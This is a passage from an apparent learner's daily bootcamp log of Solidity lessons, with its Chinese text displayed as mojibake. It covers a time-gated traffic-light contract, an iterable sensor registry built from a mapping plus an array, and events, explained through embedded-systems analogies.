        // --- TODO 4: å‘å°„äº‹ä»¶ ---
        emit LightChanged(currentState, block.timestamp);
    }
}
```

* * *

## 3\. ä½ çš„ä»»åŠ¡

1.  **è¡¥å…¨ä»£ç ï¼š** å°†ä¸Šè¿°ä»£ç åœ¨ Remix ä¸­è¡¥å…¨ã€‚
    
2.  **éƒ¨ç½²æµ‹è¯•ï¼š**
    
    -   éƒ¨ç½²åˆçº¦ã€‚
        
    -   **ç«‹å³ç‚¹å‡»** `nextState`ã€‚
        
        -   _é¢„æœŸç»“æœï¼š_ åº”è¯¥æŠ¥é”™ï¼å› ä¸ºåˆšéƒ¨ç½²ï¼ˆRedï¼‰ï¼Œæ—¶é—´æ²¡è¿‡ 60 ç§’ã€‚
            
        -   _æŠ¥é”™å†…å®¹ï¼š_ "Red light: Wait more time!"
            
    -   **ä½œå¼Šæµ‹è¯• (ä¿®æ”¹ä»£ç )ï¼š** ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œä½ å¯ä»¥æŠŠ `60` æ”¹æˆ `5` ç§’ã€‚
        
    -   **ç­‰å¾… 5 ç§’åç‚¹å‡»** `nextState`ã€‚
        
        -   _é¢„æœŸç»“æœï¼š_ äº¤æ˜“æˆåŠŸï¼ŒçŠ¶æ€å˜ä¸º `Green`ã€‚
            

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744538522-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744525665-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-18-1768744557269-image.png)

### æ€è€ƒé¢˜ï¼ˆé¢è¯•è€ƒç‚¹ï¼‰ï¼š

åœ¨åµŒå…¥å¼é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ delay(1000) è®© CPU æš‚åœã€‚åœ¨ Solidity æ™ºèƒ½åˆçº¦é‡Œï¼Œå¦‚æœæˆ‘å†™ä¸€ä¸ª while å¾ªç¯ç©ºè·‘æ¥å»¶æ—¶ï¼Œå¯è¡Œå—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ

ç­”ï¼š

ä¸èƒ½ï¼Œä¸‹é¢ä¼šè§£é‡Šä¸€ä¸‹è¿è¡Œæ¨¡å¼ï¼Œä»ä¸€ä¸ªæ¯”è¾ƒåº•å±‚çš„æ–¹é¢å»å¸®åŠ©ä½ ç†è§£

### åµŒå…¥å¼ vs åŒºå—é“¾çš„è¿è¡Œæ¨¡å¼

-   **åµŒå…¥å¼ (Active Mode):**
    
    -   ä»£ç ï¼š`void main() { while(1) { Task(); } }`
        
    -   CPUï¼šä¸€ç›´è·‘ï¼Œæ²¡äº‹å¹²å°±ç©ºè½¬ï¼ˆIdle Taskï¼‰ã€‚
        
    -   æ§åˆ¶æƒï¼š**åœ¨ä½ æ‰‹é‡Œ**ã€‚ä½ å¯ä»¥éšæ—¶è°ƒç”¨ `delay()` è®© CPU åœä¸‹æ¥ç­‰ä¸€ç­‰ã€‚
        
-   **æ™ºèƒ½åˆçº¦ (Passive Mode):**
    
    -   ä»£ç ï¼š**å¹³æ—¶é™æ­¢**ï¼Œèººåœ¨ç¡¬ç›˜ï¼ˆå…¨ç½‘èŠ‚ç‚¹çš„æ•°æ®åº“ï¼‰é‡Œã€‚
        
    -   è§¦å‘ï¼š**åªæœ‰å½“â€œäº¤æ˜“â€å‘ç”Ÿæ—¶**ï¼ŒEVM æ‰ä¼šæŠŠä½ çš„åˆçº¦åŠ è½½åˆ°å†…å­˜é‡Œæ‰§è¡Œã€‚
        

### **æ€»ç»“ä¸€ä¸‹ï¼š**

-   å…¥å£ï¼š**EVM å¹¶æ²¡æœ‰è°ƒç”¨** `main()`**ï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸€ä¸ªéšè—çš„â€œåˆ†å‘å™¨â€ (Dispatcher)ã€‚å…¥å£ï¼š** Solidity æ²¡æœ‰ `main()`ï¼Œå®ƒé€šè¿‡ **Function Selector**ï¼ˆç±»ä¼¼äº Modbus åŠŸèƒ½ç ï¼‰è¿›è¡Œä¸­æ–­åˆ†å‘ã€‚
    
-   **è¿è¡Œæ–¹å¼ï¼š** å®ƒæ˜¯è¢«åŠ¨çš„ï¼Œåªæœ‰äº¤æ˜“æ¥äº†æ‰è¿è¡Œï¼Œè¿è¡Œå®Œç«‹åˆ»é”€æ¯å†…å­˜ï¼ˆMemoryï¼‰ï¼Œåªä¿ç•™çŠ¶æ€ï¼ˆStorageï¼‰ã€‚
    
-   **ä¸èƒ½ Delayï¼š** å› ä¸º **Gas å¤ªè´µï¼ˆçœ‹é—¨ç‹—ä¼šå¤ä½ï¼‰** ä¸” **ä¸èƒ½é˜»å¡å…¨çƒå…±è¯†**ã€‚
    

å¦‚æœä½ èƒ½å­¦åˆ°è¿™é‡Œï¼Œæ­å–œä½ æŒæ¡äº†æœ€åŸºæœ¬çš„Solidityè¯­æ³•ï¼Œç¬¬äºŒå‘¨æˆ‘ä»¬å°†æ·±å…¥ç ”ç©¶å¦‚ä½•åƒæ“ä½œå¯„å­˜å™¨ä¸€æ ·æ“ä½œè¿™äº›äºŒè¿›åˆ¶æ•°æ®ã€‚
<!-- DAILY_CHECKIN_2026-01-18_END -->

# 2026-01-17
<!-- DAILY_CHECKIN_2026-01-17_START -->













# ç¬¬6å¤©ï¼šé«˜çº§æ•°æ®ç»“æ„ â€”â€” çªç ´ Mapping çš„é™åˆ¶

ä»Šå¤©æ˜¯å‘¨å…­ï¼Œå¤§å®¶è¿™ä¸€å‘¨è¿‡çš„æ€ä¹ˆæ ·å‘¢ï¼Ÿä»Šå¤©å…ˆåšäº›ç®€å•çš„ä»»åŠ¡å§ï¼Œä½†ä¸ç®¡å¦‚ä½•ï¼Œè¯·ä½ æŠŠæˆ‘ç»™å‡ºçš„ç¤ºä¾‹ä»£ç ä¸­çš„æ¯ä¸ªç‚¹éƒ½ç†è§£ä¸€ä¸‹ï¼Œå¹¶ä¸”æœ€å¥½å¯ä»¥è‡ªå·±æ‰‹æ‰“ä¸€éï¼Œä»¥åŠ æ·±å¯¹Solidityåˆçº¦çš„ç†è§£ï¼Œæ¥ä¸‹æ¥ï¼Œå’Œæˆ‘è¿›å…¥å­¦ä¹ çš„ä¸–ç•Œå§ã€‚

æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ï¼Œ`mapping` æ˜¯ä¸€ä¸ªå·¨å¤§çš„å“ˆå¸Œè¡¨ï¼Œå®ƒæœ‰ä¸€ä¸ªè‡´å‘½çš„å¼±ç‚¹ï¼š**æ— æ³•éå†**ã€‚ ä½ ä¸èƒ½å†™ `for (i=0; i<mapping.length; i++)`ã€‚è¿™å¯¹äºä¹ æƒ¯äº† C è¯­è¨€æ•°ç»„éå†çš„å·¥ç¨‹å¸ˆæ¥è¯´æå…¶éš¾å—ã€‚

ä»Šå¤©æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼š**æ„å»ºä¸€ä¸ªâ€œå¯éå†â€çš„å­˜å‚¨ç³»ç»Ÿ**ã€‚

## 1\. ç†è®ºæ˜ å°„ï¼šé“¾è¡¨ vs ç´¢å¼•æ•°ç»„

åœ¨åµŒå…¥å¼æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ FATFS æˆ– SPIFFSï¼‰ä¸­ï¼Œå¦‚æœä½ æƒ³åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼Œç³»ç»Ÿé€šå¸¸ç»´æŠ¤äº†ä¸€ä¸ªæ–‡ä»¶åˆ†é…è¡¨ï¼ˆFATï¼‰æˆ–è€…ç›®å½•é¡¹åˆ—è¡¨ã€‚

åœ¨ Solidity ä¸­ï¼Œä¸ºäº†å®ç°â€œåˆ—å‡ºæ‰€æœ‰ä¼ æ„Ÿå™¨â€çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬é€šå¸¸é‡‡ç”¨ **Mapping + Array** çš„ç»„åˆæ¨¡å¼ ï¼š

-   **Mapping:** ç”¨äº**éšæœºè®¿é—®**ï¼ˆO(1) å¤æ‚åº¦ï¼Œé€šè¿‡ ID æŸ¥æ•°æ®ï¼‰ã€‚
    
-   **Array:** ç”¨äº**è®°å½•ç´¢å¼•**ï¼ˆå­˜å‚¨æ‰€æœ‰çš„ IDï¼Œæ–¹ä¾¿éå†ï¼‰ã€‚
    

## 2\. ä»£ç å®æˆ˜ï¼š`SensorRegistry`

è¯·åœ¨ Remix ä¸­æ–°å»º `Day6_IterableMapping.sol`ã€‚æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªæ³¨å†Œè¡¨ï¼Œæ—¢èƒ½æŸ¥å•ä¸ªï¼Œåˆèƒ½æŸ¥æ‰€æœ‰ã€‚

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SensorRegistry {
    
    struct SensorInfo {
        uint256 id;
        string location; // å®‰è£…ä½ç½®ï¼Œå¦‚ "Factory_A"
        bool isRegistered; // é˜²æ­¢é‡å¤æ³¨å†Œçš„æ ‡å¿—ä½
    }

    // 1. æ ¸å¿ƒå­˜å‚¨ï¼šID -> è¯¦ç»†ä¿¡æ¯ (ç±»ä¼¼äº Flash é‡Œçš„æ•°æ®åŒº)
    mapping(uint256 => SensorInfo) public sensors;

    // 2. ç´¢å¼•æ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰å·²æ³¨å†Œçš„ ID (ç±»ä¼¼äºæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•è¡¨)
    uint256[] public sensorIds;

    // äº‹ä»¶
    event SensorRegistered(uint256 id, string location);

    // æ³¨å†Œæ–°ä¼ æ„Ÿå™¨
    function registerSensor(uint256 _id, string memory _location) public {
        // [Check] æ£€æŸ¥ ID æ˜¯å¦å·²å­˜åœ¨ (åˆ©ç”¨ mapping çš„ O(1) æŸ¥æ‰¾ä¼˜åŠ¿)
        require(!sensors[_id].isRegistered, "ID already exists!");

        // [Effect 1] å­˜å…¥è¯¦ç»†æ•°æ®
        sensors[_id] = SensorInfo(_id, _location, true);

        // [Effect 2] è®°å½• ID åˆ°æ•°ç»„ (ä¸ºäº†ä»¥åèƒ½éå†)
        sensorIds.push(_id);

        // [Interaction]
        emit SensorRegistered(_id, _location);
    }

    // è·å–ä¼ æ„Ÿå™¨æ€»æ•°
    function getSensorCount() public view returns (uint256) {
        return sensorIds.length;
    }

    // --- æ ¸å¿ƒåŠŸèƒ½ï¼šè·å–æ‰€æœ‰ä¼ æ„Ÿå™¨ ID ---
    // æ³¨æ„ï¼šå¦‚æœæ•°ç»„å¤ªå¤§ï¼Œè¿™ä¸ªå‡½æ•°å¯èƒ½ä¼šå› ä¸º Gas è¶…é™è€Œæ— æ³•è¢«åˆçº¦å†…éƒ¨è°ƒç”¨ï¼Œ
    // ä½†å¤–éƒ¨å‰ç«¯è°ƒç”¨æ˜¯å…è´¹çš„ã€‚
    function getAllSensorIds() public view returns (uint256[] memory) {
        return sensorIds;
    }
}
```

## 3\. å®éªŒä»»åŠ¡

è¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼Œä½“éªŒâ€œç»„åˆæ•°æ®ç»“æ„â€çš„å¨åŠ›ï¼š

1.  **éƒ¨ç½²** `SensorRegistry`ã€‚
    
2.  **æ³¨å†Œä¸‰ä¸ªä¼ æ„Ÿå™¨ï¼š**
    
    -   `registerSensor(101, "Lab_1")`
        
    -   `registerSensor(102, "Greenhouse")`
        
    -   `registerSensor(103, "PumpStation")`
        
3.  **å°è¯•é‡å¤æ³¨å†Œï¼š**
    
    -   å†æ¬¡è¾“å…¥ `101`ï¼Œç‚¹å‡»äº¤æ˜“ã€‚è§‚å¯Ÿæ˜¯å¦æŠ¥é”™ï¼ˆéªŒè¯ `mapping` çš„æŸ¥é‡èƒ½åŠ›ï¼‰ã€‚
        
4.  **éå†æŸ¥è¯¢ï¼ˆå…³é”®ï¼‰ï¼š**
    
    -   ç‚¹å‡» `getAllSensorIds` æŒ‰é’®ã€‚
        
    -   **é¢„æœŸç»“æœï¼š** ä½ åº”è¯¥èƒ½ä¸€æ¬¡æ€§è·å¾—ä¸€ä¸ªæ•°ç»„ `[101, 102, 103]`ã€‚è¿™æ˜¯å•çº¯ä½¿ç”¨ `mapping` ç»å¯¹åšä¸åˆ°çš„ã€‚
        

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-17-1768655001052-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-17-1768655016659-image.png)

### é˜¶æ®µæ€§é‡Œç¨‹ç¢‘

åšå®Œä»Šå¤©çš„å†…å®¹ï¼Œä½ å·²ç»æŒæ¡äº† Solidity æœ€æ ¸å¿ƒçš„ 80% è¯­æ³•ï¼š

-   \[x\] çŠ¶æ€æœºåŸç†
    
-   \[x\] Gas æˆæœ¬æ„è¯†
    
-   \[x\] åŸºç¡€æ•°æ®ç±»å‹ä¸ç»“æ„ä½“
    
-   \[x\] æƒé™æ§åˆ¶ (`modifier`)
    
-   \[x\] å¤–éƒ¨é€šä¿¡ (`event`)
    
-   \[x\] **å¤æ‚æ•°æ®å­˜å‚¨ (**`mapping` **+** `array`**)** -> _Today_
    

**æ˜æ—¥é¢„å‘Šï¼ˆDay 7ï¼‰ï¼šç¬¬ä¸€å‘¨è€ƒæ ¸é¡¹ç›®** æˆ‘ä»¬è¦æŠŠè¿™äº›ç§¯æœ¨æ­æˆä¸€ä¸ªçœŸæ­£çš„â€œçº¢ç»¿ç¯çŠ¶æ€æœºç³»ç»Ÿâ€œã€‚

è¿™å°†æ˜¯ä½ ç¬¬ä¸€ä¸ªå®Œæ•´çš„ã€å¸¦æœ‰æ—¶é—´æ§åˆ¶é€»è¾‘çš„æ™ºèƒ½åˆçº¦é¡¹ç›® ã€‚
<!-- DAILY_CHECKIN_2026-01-17_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->














# ç¬¬5å¤©ï¼šäº‹ä»¶æ—¥å¿— (Events) â€”â€” åŒºå—é“¾ç‰ˆçš„ `printf`

_ï¼ˆæ³¨ï¼šæ ¹æ®åŸæœ¬çš„è®¡åˆ’ï¼Œä»Šå¤©åº”è¯¥æ˜¯è®²â€œé«˜çº§æ˜ å°„â€ï¼Œä½†æˆ‘å†³å®šå…ˆæŠŠâ€œäº‹ä»¶â€æä¸Šæ¥ï¼Œå› ä¸ºå®ƒæ˜¯è§£å†³è°ƒè¯•éš¾é¢˜çš„ç¥å™¨ï¼Œä¹Ÿæ˜¯åµŒå…¥å¼å·¥ç¨‹å¸ˆæœ€ç†Ÿæ‚‰çš„é€šä¿¡æ¨¡å¼ã€‚ï¼‰_

## 1\. ç†è®ºæ˜ å°„ï¼šä¸²å£æ‰“å°ä¸ä¸­æ–­ä¿¡å·

åœ¨ STM32 å¼€å‘ä¸­ï¼Œå½“ç³»ç»Ÿè·‘é£æˆ–è€…æƒ³çŸ¥é“å½“å‰æ¸©åº¦æ˜¯å¤šå°‘æ—¶ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿ

1.  **æ–¹æ³• A (Debug):** æš‚åœ CPUï¼Œç”¨ J-Link æŸ¥çœ‹å†…å­˜å˜é‡ï¼ˆè¿™å°±åƒæˆ‘ä»¬ä¹‹å‰ç”¨çš„ `sensors` æŒ‰é’®ï¼Œè¯» Storageï¼‰ã€‚
    
2.  **æ–¹æ³• B (Log):** åœ¨ä»£ç é‡Œå†™ `printf("Temp: %d\n", temp);`ï¼Œé€šè¿‡ä¸²å£ï¼ˆUARTï¼‰æŠŠæ•°æ®åå‡ºæ¥ã€‚
    
3.  **æ–¹æ³• C (Interrupt):** æŸä¸ªå¼•è„šç”µå¹³è·³å˜ï¼Œè§¦å‘å¤–éƒ¨ä¸­æ–­ï¼Œé€šçŸ¥ä¸»æ§ã€‚
    

åœ¨ Solidity ä¸­ï¼Œ**Events (äº‹ä»¶)** åŒæ—¶æ‰®æ¼”äº† **æ–¹æ³• B** å’Œ **æ–¹æ³• C** çš„è§’è‰²ã€‚

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768571631108-image.png)

æ ¸å¿ƒæ¦‚å¿µï¼š

æ™ºèƒ½åˆçº¦æ˜¯â€œå“‘å·´â€ï¼Œå®ƒåœ¨é“¾ä¸Šé»˜é»˜è¿è¡Œã€‚åªæœ‰é€šè¿‡ emit å‘å°„äº‹ä»¶ï¼Œå®ƒæ‰èƒ½å‘Šè¯‰é“¾ä¸‹çš„ Python/JS è„šæœ¬ï¼šâ€œå–‚ï¼Œåˆšæ‰æœ‰äººæ”¹äº†æ•°æ®ï¼ŒIDæ˜¯101ï¼Œæ–°æ¸©åº¦æ˜¯25åº¦ï¼â€

* * *

## 2\. è¯­æ³•å®æˆ˜

æˆ‘ä»¬æœ‰ä¸¤ä¸ªå…³é”®å­—ï¼š

1.  `event`: å®šä¹‰æ—¥å¿—æ ¼å¼ï¼ˆç±»ä¼¼äºå®šä¹‰ `struct` æˆ–æŠ¥æ–‡åè®®å¤´ï¼‰ã€‚
    
2.  `emit`: å‘é€æ—¥å¿—ï¼ˆç±»ä¼¼äºè°ƒç”¨ `printf`ï¼‰ã€‚
    

**ä»»åŠ¡ï¼š** ä¿®æ”¹ä½ çš„ `SensorLogger`ï¼ŒåŠ ä¸Šæ—¥å¿—åŠŸèƒ½ã€‚

è¯·åœ¨ Remix ä¸­æ–°å»º `Day5_Events.sol`ï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼ˆèåˆäº†ä¹‹å‰çš„æƒé™æ§åˆ¶ï¼‰ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EventLogger {
    
    // 1. å®šä¹‰äº‹ä»¶ (åè®®å¤´)
    // indexed å…³é”®å­—ï¼šç›¸å½“äºå»ºç«‹ç´¢å¼•ï¼Œå…è®¸å¤–éƒ¨å·¥å…·å¿«é€Ÿè¿‡æ»¤æœç´¢ (ç±»ä¼¼ Wireshark çš„ Filter)
    event DataUpdated(uint256 indexed deviceId, uint256 temperature, address indexed operator);
    
    // æŠ¥è­¦äº‹ä»¶
    event HighTempAlert(uint256 indexed deviceId, uint256 temperature, string message);

    struct SensorData {
        uint16 temperature;
        bool isValid;
    }
    mapping(uint256 => SensorData) public sensors;
    address public owner;

    constructor() { owner = msg.sender; }

    function updateData(uint256 _id, uint16 _temp) public {
        require(msg.sender == owner, "Auth Fail");

        // [Effects] ä¿®æ”¹çŠ¶æ€
        sensors[_id] = SensorData(_temp, true);

        // [Interaction] å‘å°„äº‹ä»¶ (å°±åƒ printf)
        // è¿™æ¡æ—¥å¿—ä¼šæ°¸ä¹…è®°å½•åœ¨åŒºå—é‡Œï¼Œä½†ä¸ä¼šä¿®æ”¹ State (çœé’±)
        emit DataUpdated(_id, _temp, msg.sender);

        // æ¨¡æ‹Ÿç®€å•çš„é˜ˆå€¼æŠ¥è­¦
        if (_temp > 5000) { // å‡è®¾ 50.00 åº¦æ˜¯é˜ˆå€¼
            emit HighTempAlert(_id, _temp, "Warning: Overheat!");
        }
    }
}
```

* * *

## 3\. å®éªŒæ“ä½œï¼šæ•æ‰â€œä¸²å£æ•°æ®â€

### **æ­¥éª¤ 1ï¼šéƒ¨ç½²åˆçº¦**

1.  åƒå¾€å¸¸ä¸€æ ·éƒ¨ç½² `EventLogger`ã€‚
    

### **æ­¥éª¤ 2ï¼šè§¦å‘äº‹ä»¶**

1.  è°ƒç”¨ `updateData`ï¼Œè¾“å…¥ `101, 2550` (25.5åº¦)ã€‚
    
2.  è°ƒç”¨ `updateData`ï¼Œè¾“å…¥ `101, 6000` (60.0åº¦ï¼Œ**è§¦å‘æŠ¥è­¦**)ã€‚
    

### æ­¥éª¤ 3ï¼šæŸ¥çœ‹æ—¥å¿— (æ ¸å¿ƒæ­¥éª¤)

è¿™æ˜¯å¾ˆå¤šåˆå­¦è€…æ‰¾ä¸åˆ°çš„åœ°æ–¹ã€‚

1.  åœ¨æ§åˆ¶å°ï¼ˆTerminalï¼‰æ‰¾åˆ°åˆšåˆšæˆåŠŸçš„äº¤æ˜“ï¼ˆç»¿è‰²å¯¹å‹¾ï¼‰ã€‚
    
2.  ç‚¹å‡»å±•å¼€äº¤æ˜“è¯¦æƒ…ã€‚
    
3.  å‘ä¸‹æ»šåŠ¨ï¼Œæ‰¾åˆ° **â€œLogsâ€** å­—æ®µã€‚
    
    -   å®ƒæ˜¯ JSON æ ¼å¼çš„æ•°ç»„ã€‚
        
    -   ä½ ä¼šçœ‹åˆ° `DataUpdated` å’Œ `HighTempAlert` çš„è¯¦ç»†å†…å®¹ã€‚
        
    -   æ³¨æ„çœ‹ `args` (å‚æ•°) é‡Œçš„æ•°æ®ï¼Œæ˜¯ä¸æ˜¯å’Œä½ è¾“å…¥çš„ä¸€æ ·ï¼Ÿ
        

* * *

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768570899712-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768570919383-image.png)

## 4\. æ·±åº¦æ€è€ƒï¼šIndexed (ç´¢å¼•) çš„æ„ä¹‰

åœ¨ä»£ç ä¸­ï¼Œæˆ‘ç»™ `deviceId` åŠ äº† `indexed` å…³é”®å­—ã€‚

Solidity

```
event DataUpdated(uint256 indexed deviceId, ...);
```

è¿™æœ‰ä»€ä¹ˆç”¨ï¼Ÿ

æƒ³è±¡ä¸€ä¸‹ï¼Œä½ çš„åˆçº¦é‡Œæœ‰ 10,000 ä¸ªä¼ æ„Ÿå™¨åœ¨ä¸æ–­ä¸Šä¼ æ•°æ®ã€‚

-   **æ²¡æœ‰ indexed:** å¦‚æœä½ æƒ³æ‰¾â€œID ä¸º 101 çš„æ‰€æœ‰å†å²è®°å½•â€ï¼Œå‰ç«¯è„šæœ¬å¿…é¡»æŠŠ 10,000 æ¡æ—¥å¿—å…¨éƒ¨ä¸‹è½½ä¸‹æ¥ï¼Œä¸€æ¡æ¡éå†è§£æã€‚æ•ˆç‡æä½ã€‚
    
-   **æœ‰ indexed:** è¿™é‡Œçš„ `deviceId` è¢«åŠ å…¥åˆ°äº† **Bloom Filter (å¸ƒéš†è¿‡æ»¤å™¨)** ä¸­ã€‚èŠ‚ç‚¹å¯ä»¥ç¬é—´å‘Šè¯‰ä½ ï¼šâ€œåªç»™æˆ‘ ID=101 çš„æ—¥å¿—â€ï¼Œå…¶ä»– 9999 æ¡ç›´æ¥å¿½ç•¥ã€‚
    

**è¿™å°±åƒ SQL é‡Œçš„** `WHERE deviceId = 101`**ï¼Œæˆ–è€… Wireshark é‡Œçš„** `tcp.port == 80`**ã€‚**

* * *

### ä»Šæ—¥ä½œä¸š

1.  **æ“ä½œéªŒè¯ï¼š** è¿è¡Œä»£ç ï¼Œè§¦å‘ä¸€æ¬¡æŠ¥è­¦ï¼Œæˆªå›¾æ§åˆ¶å°é‡Œçš„ **Logs** éƒ¨åˆ†ç»™æˆ‘çœ‹ã€‚
    
2.  **æ€è€ƒé¢˜ï¼š** æ—¢ç„¶ `emit Event` è¿™ä¹ˆä¾¿å®œï¼ˆç›¸æ¯”äº `SSTORE` å†™çŠ¶æ€ï¼‰ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä¸æŠŠæ‰€æœ‰å†å²æ•°æ®ï¼ˆæ¯”å¦‚æ¯ç§’çš„æ¸©åº¦ï¼‰éƒ½åªç”¨ `Event` å‘å‡ºæ¥ï¼Œè€Œæ ¹æœ¬ä¸å­˜åˆ° `mapping` é‡Œå‘¢ï¼Ÿ
    
    -   _æç¤ºï¼šæ™ºèƒ½åˆçº¦è‡ªå·±èƒ½è¯»åˆ°_ `Event` _å—ï¼Ÿå¦‚æœæˆ‘æƒ³åœ¨åˆçº¦é‡Œå†™ä¸€ä¸ªåŠŸèƒ½â€œè®¡ç®—è¿‡å» 10 æ¬¡æ¸©åº¦çš„å¹³å‡å€¼â€ï¼Œåªç”¨ Event èƒ½å®ç°å—ï¼Ÿ_
        

åšå®Œè¿™ä¸ªï¼Œæˆ‘ä»¬å°±å½»åº•æ‰“é€šäº†â€œé“¾ä¸Šï¼ˆå›ºä»¶ï¼‰â€ä¸â€œé“¾ä¸‹ï¼ˆç›‘æ§è½¯ä»¶ï¼‰â€çš„é€šä¿¡æ¸ é“ï¼

### æ€è€ƒé¢˜å›ç­”

ç­”ï¼š**Event å’Œ Mapping éƒ½æ˜¯â€œSSDâ€**ï¼ˆå®ƒä»¬çš„æ•°æ®éƒ½ä¼šè¢«æ°¸ä¹…è®°å½•åœ¨åŒºå—é“¾çš„å†å²åŒºå—ä¸­ï¼Œæ°¸è¿œä¸ä¼šæ¶ˆå¤±ï¼‰ã€‚

**çœŸæ­£çš„åŒºåˆ«åœ¨äºâ€œè°èƒ½è¯»â€ï¼š**

1.  **Mapping (**`SSTORE`**/**`SLOAD`**):**
    
    -   **å¯è§æ€§ï¼š** åˆçº¦**è‡ªå·±**èƒ½è¯»ï¼Œå¤–éƒ¨ä¹Ÿèƒ½è¯»ã€‚
        
    -   **åµŒå…¥å¼ç±»æ¯”ï¼š** **å†…éƒ¨ Flash/EEPROM**ã€‚CPU å¯ä»¥è¯»å–è¿™é‡Œçš„å†å²æ•°æ®æ¥åšè®¡ç®—ï¼ˆæ¯”å¦‚ï¼š`if (last_temp > 50) { shutdown(); }`ï¼‰ã€‚
        
    -   **æˆæœ¬ï¼š** æè´µã€‚
        
2.  **Event (**`LOG` **opcode):**
    
    -   **å¯è§æ€§ï¼š** **åˆçº¦è‡ªå·±è¯»ä¸åˆ°ï¼** åªæœ‰é“¾ä¸‹çš„å¤–éƒ¨ç¨‹åºï¼ˆå‰ç«¯/Pythonè„šæœ¬ï¼‰èƒ½è¯»ã€‚
        
    -   **åµŒå…¥å¼ç±»æ¯”ï¼š** **UART ä¸²å£æ‰“å° (**`printf`**)**ã€‚
        
    -   **å…³é”®ç‚¹ï¼š** ä½ åœ¨ä»£ç é‡Œå†™äº† `printf("Temp: 60");`ï¼Œæ•°æ®å°±ä»ä¸²å£å‘èµ°äº†ã€‚MCUï¼ˆåˆçº¦ï¼‰èƒ½ä¸èƒ½å›å¤´å»è¯»å–åˆšæ‰å‘å‡ºå»çš„å­—ç¬¦ä¸²æ¥åšåŠ æ³•è¿ç®—ï¼Ÿ**ä¸èƒ½ï¼** æ•°æ®å·²ç»ç¦»å¼€ CPU è¿›å…¥äº†ä¸²å£çº¿ï¼ˆåŒºå—é“¾æ—¥å¿—åŒºï¼‰ã€‚
        

**ç»“è®ºï¼š** å¦‚æœä½ éœ€è¦â€œæ ¹æ®å†å²æ•°æ®åšé€»è¾‘åˆ¤æ–­â€**ï¼ˆæ¯”å¦‚è®¡ç®—å¹³å‡å€¼ã€åˆ¤æ–­æ˜¯å¦è¿ç»­ä¸‰æ¬¡æŠ¥è­¦ï¼‰ï¼Œå¿…é¡»å­˜ Mapping/Storageã€‚ å¦‚æœä½ åªæ˜¯ä¸ºäº†**â€œå­˜è¯â€**æˆ–**â€œé€šçŸ¥ç”¨æˆ·â€ï¼Œåç»­ä¸å†å‚ä¸åˆçº¦é€»è¾‘è®¡ç®—ï¼Œé‚£ä¹ˆç”¨ **Event**ï¼Œèƒ½çœä¸‹ 90% çš„ Gas è´¹ç”¨ ã€‚
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->
















æ˜¨å¤©çš„åˆçº¦è™½ç„¶èƒ½è·‘ï¼Œä½†åœ¨åµŒå…¥å¼é¢†åŸŸï¼Œè¿™ç›¸å½“äºæŠŠè°ƒè¯•ä¸²å£ï¼ˆUART Debug Shellï¼‰ç›´æ¥æš´éœ²åˆ°äº†å…¬ç½‘ä¸Šï¼Œä»»ä½•è¿ä¸Šçº¿çš„äººéƒ½èƒ½å‘é€ AT æŒ‡ä»¤ä¿®æ”¹ç³»ç»Ÿå‚æ•°ã€‚

ä»Šå¤©è¦ç»™è¿™ä¸ªç³»ç»ŸåŠ ä¸Š **â€œRoot æƒé™â€** å’Œ **â€œå¯åŠ¨è‡ªæ£€ä»£ç â€**ã€‚

## 1\. ç†è®ºæ˜ å°„ï¼šå¯åŠ¨ä»£ç ä¸æƒé™ä½

### **A. æ„é€ å‡½æ•° (constructor) = SystemInit()**

åœ¨ STM32 ä¸­ï¼Œä¸Šç”µå¤ä½åï¼Œä¼šå…ˆæ‰§è¡Œå¯åŠ¨æ–‡ä»¶ï¼ˆStartup fileï¼‰é‡Œçš„å¤ä½å¤„ç†å‡½æ•°ï¼Œåˆå§‹åŒ–æ—¶é’Ÿã€å †æ ˆç­‰ã€‚è¿™æ®µä»£ç **åªè·‘ä¸€æ¬¡**ã€‚ åœ¨ Solidity ä¸­ï¼Œconstructor å°±æ˜¯è¿™æ®µä»£ç ã€‚å®ƒåªåœ¨åˆçº¦**éƒ¨ç½²ï¼ˆDeploymentï¼‰** çš„ç¬é—´æ‰§è¡Œä¸€æ¬¡ï¼Œä¹‹åæ°¸è¿œæ— æ³•å†æ¬¡è°ƒç”¨ã€‚

